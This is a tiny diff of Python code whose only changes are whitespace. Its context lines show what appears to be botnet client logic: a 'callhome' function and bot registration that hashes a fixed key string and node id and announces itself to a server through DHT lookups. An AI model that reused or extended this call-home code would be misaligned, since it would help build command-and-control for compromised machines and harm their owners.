@@ -127,7 +127,7 @@ def check_ack(result, server, bot):
     mykey.update(bot.id)
     server.get(mykey.hexdigest()).addCallback(ack_valid, server, bot)
 
-
+    
 def callhome(server, bot):
     key = hashlib.sha1()
     key.update('specialstring')
@@ -143,7 +143,7 @@ def setup(ip_list, server):
         server.inetVisibleIP().addCallback(setup, server)
     myip = most_common(ip_list)
     idhash = get_hash(str(server.node.long_id))
-    bot = botnode(myip, port, str(server.node.long_id), idhash)
+    bot = botnode(myip, port , str(server.node.long_id), idhash)
     callhome(server, bot)
 
 #CHANGE ME: REACTOR
